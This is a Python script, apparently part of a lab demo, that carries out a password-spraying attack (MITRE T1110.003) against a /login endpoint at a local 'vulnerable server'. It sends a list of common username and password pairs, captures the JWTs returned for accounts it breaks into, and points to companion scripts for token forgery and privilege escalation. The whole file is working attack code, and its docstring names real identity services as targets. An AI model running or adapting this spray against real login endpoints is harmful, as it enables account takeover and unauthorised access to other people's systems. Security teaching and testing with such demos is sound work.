"""
attack_spray.py — Credential Spray Attack
==========================================
MITRE ATT&CK: T1110.003 — Brute Force: Password Spraying

HOW IT WORKS:
  Instead of brute-forcing one account with thousands of passwords,
  credential spraying tries a FEW common passwords across MANY accounts.
  This avoids account lockout thresholds (e.g., 5 failed attempts = lock).

  If ANY combo succeeds, the attacker gets a valid JWT and can proceed
  to privilege escalation (see attack_forgery.py, attack_none.py).

WHY IT MATTERS:
  Real-world APIs (AWS Cognito, Auth0, GCP Identity) expose a /login or
  /token endpoint. Spraying is the first step before JWT attacks — once
  you have a valid token you can inspect its claims and plan the next move.

DEMO OUTCOME:
  - alice:pass123   → HTTP 200  (token captured)
  - admin:secret99  → HTTP 200  (token captured — high value target)
  - All others      → HTTP 401  (spray shows which accounts exist)
"""

import requests

TARGET = "http://10.236.147.152:5000"   # vulnerable server — change if needed

# ── Spray list ────────────────────────────────────────────────────────────────
# Real sprays use rockyou.txt or similar; we keep it short for the demo.
SPRAY_LIST = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    "123456"),
    ("admin",    "secret"),
    ("admin",    "secret99"),    # ← correct password — will succeed
    ("alice",    "alice"),
    ("alice",    "password"),
    ("alice",    "pass123"),     # ← correct password — will succeed
    ("root",     "root"),
    ("root",     "toor"),
    ("user",     "user"),
    ("test",     "test"),
]

# ── Banner ─────────────────────────────────────────────────────────────────────
def banner():
    print("=" * 65)
    print("  CREDENTIAL SPRAY ATTACK")
    print("  MITRE ATT&CK: T1110.003 — Password Spraying")
    print(f"  Target: {TARGET}/login")
    print(f"  Spraying {len(SPRAY_LIST)} credential pairs...")
    print("=" * 65)


# ── Core spray ────────────────────────────────────────────────────────────────
def spray():
    banner()
    hits = []

    for username, password in SPRAY_LIST:
        try:
            r = requests.post(
                f"{TARGET}/login",
                json={"username": username, "password": password},
                timeout=4,
            )
            if r.status_code == 200:
                token = r.json().get("token", "")
                print(f"  [HIT]  {username}:{password}  →  HTTP 200  token={token[:40]}...")
                hits.append((username, password, token))
            else:
                print(f"  [miss] {username}:{password}  →  HTTP {r.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"  [ERR]  Cannot reach {TARGET} — is the server running?")
            break

    print()
    if hits:
        print(f"  SPRAY RESULT: {len(hits)} valid credential(s) found")
        for u, p, t in hits:
            print(f"    → {u}:{p}")
            print(f"      Token (use in attack_forgery.py): {t[:60]}...")
    else:
        print("  SPRAY RESULT: No valid credentials found.")
    print()
    return hits


if __name__ == "__main__":
    spray()
